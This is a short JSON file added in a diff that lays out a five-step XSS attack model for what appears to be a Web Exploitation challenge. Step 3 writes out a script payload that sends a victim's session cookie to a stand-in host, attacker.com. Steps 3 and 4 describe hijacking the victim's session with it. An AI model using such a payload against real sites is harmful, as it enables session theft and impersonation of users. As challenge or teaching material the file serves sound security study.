@@ -1,0 +1,26 @@
+{
+    "AttackModel": {
+        "Steps": [
+            {
+                "StepNumber": 1,
+                "StepString": "Entered a malicious payload containing a JavaScript script into the search parameter, such as <script>alert('XSS');</script>, to test for XSS"
+            },
+            {
+                "StepNumber": 2,
+                "StepString": "Submitted the payload, causing the application to execute the JavaScript script, confirming the presence of an XSS vulnerability"
+            },
+            {
+                "StepNumber": 3,
+                "StepString": "Researched the application's system and network configuration to craft a payload containing a script that would steal the user's session cookie and send it to an attacker-controlled server, such as <script>new Image().src=\"http://attacker.com/steal.php?cookie=\"+document.cookie;</script>"
+            },
+            {
+                "StepNumber": 4,
+                "StepString": "Stole the user's session cookie, impersonated the user, and gained access to the application's sensitive information"
+            },
+            {
+                "StepNumber": 5,
+                "StepString": "Used the XSS vulnerability to complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS"
+            }
+        ]
+    }
+}
